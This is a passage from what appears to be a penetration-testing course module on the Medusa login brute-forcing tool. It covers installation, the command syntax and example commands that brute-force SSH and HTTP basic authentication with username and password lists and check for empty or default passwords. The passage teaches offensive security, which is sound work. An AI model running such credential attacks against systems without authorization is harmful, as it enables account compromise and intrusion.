...
```shell
3kjS@htb[/htb]$ medusa -h
```

```shell
3kjS@htb[/htb]$ sudo apt-get -y update 
3kjS@htb[/htb]$ sudo apt-get -y install medusa
```
## Command Syntax and Parameter Table

```shell
3kjS@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```
...
```shell
3kjS@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```
### Targeting Multiple Web Servers with Basic HTTP Authentication

```shell
3kjS@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```
### Testing for Empty or Default Passwords

```shell
3kjS@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
